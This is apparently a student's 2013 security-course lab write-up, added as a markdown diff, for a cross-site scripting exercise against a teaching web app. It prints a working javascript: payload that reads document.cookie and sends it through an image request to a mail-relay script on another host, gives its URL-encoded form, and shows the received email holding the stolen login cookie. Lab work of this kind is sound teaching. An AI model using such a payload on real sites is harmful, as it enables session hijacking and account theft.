@@ -1,0 +1,35 @@
+#CCS Lab 5
+---
+
+1120379050 王灏 wh.sjtu@gmail.com
+
+June 6, 2013
+
+####Exercise 1:
+
+From the example attack, I change the javascript code for sending the cookie of user to the email address.
+
+the original URL is like below:
+
+	javascript:void((new Image()).src='http://tcloud.sjtu.edu.cn/course/css/sendmail.php?' + 'to=chapter09@sjtu.edu.cn' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random());
+
+after encoded by the [http://www.dommermuth.com/protosite/experiments/encode/index.html](http://www.dommermuth.com/protosite/experiments/encode/index.html), we get:
+
+	javascript%3Avoid%28%28new%20Image%28%29%29%2Esrc%3D%27http%3A%2F%2Ftcloud%2Esjtu%2Eedu%2Ecn%2Fcourse%2Fcss%2Fsendmail%2Ephp%3F%27%20%2B%20%27to%3Dchapter09%40sjtu%2Eedu%2Ecn%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent%28document%2Ecookie%29%20%2B%20%27%26random%3D%27%20%2B%20Math%2Erandom%28%29%29%3B
+
+Then my SJTU mailbox receives a letter, which means we have stolen the cookie:
+
+	Date: Thu, 6 Jun 2013 11:51:11 +0800
+	To: tcloudcss@126.com, chapter09@sjtu.edu.cn
+	Subject: Message from chapter09@sjtu.edu.cn
+	From: tcloudcss@126.com
+	X-CM-TRANSID:C8mowEBpG0dMB7BRJjpHBw--.439S2
+	X-Coremail-Antispam: 1Uf129KBjDUn29KB7ZKAUJUUUUU529EdanIXcx71UUUUU7v73
+		VFW2AGmfu7bjvjm3AaLaJ3UbIYCTnIWIevJa73UjIFyTuYvjxUcApeUUUUU
+	Message-Id: <51B0074F.0C1E52.23664@m15-111.126.com>
+	X-CM-SenderInfo: 5wfo03pgfv2qqrswhudrp/1tbifg40alGfLECIsAAAs0
+	
+	Payload:
+	
+	PyZoobarLogin=test123#e544c6c66ae718b33b422d323c899633
+	
